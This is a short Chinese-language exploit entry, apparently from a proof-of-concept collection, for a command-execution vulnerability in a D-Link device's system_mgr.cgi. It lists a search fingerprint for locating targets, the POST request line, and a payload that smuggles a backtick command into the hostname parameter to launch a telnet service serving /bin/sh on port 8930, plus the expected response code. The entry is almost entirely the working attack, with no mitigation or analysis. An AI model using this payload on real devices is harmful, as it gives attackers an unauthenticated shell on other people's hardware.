# D-Link_system_mgr.cgi存在命令执行漏洞

D-Link_system_mgr.cgi ｜ 命令执行 ｜ —
- **指纹**：`"D-Link-DIR"`
- **请求**：`POST /cgi-bin/system\_mgr.cgi HTTP/1.1`

**Payload**
```
cmd=cgi\_device\&hostname=`utelnetd -p 8930 -l /bin/sh`\&workgroup=\&description=
```
- **响应特征**：200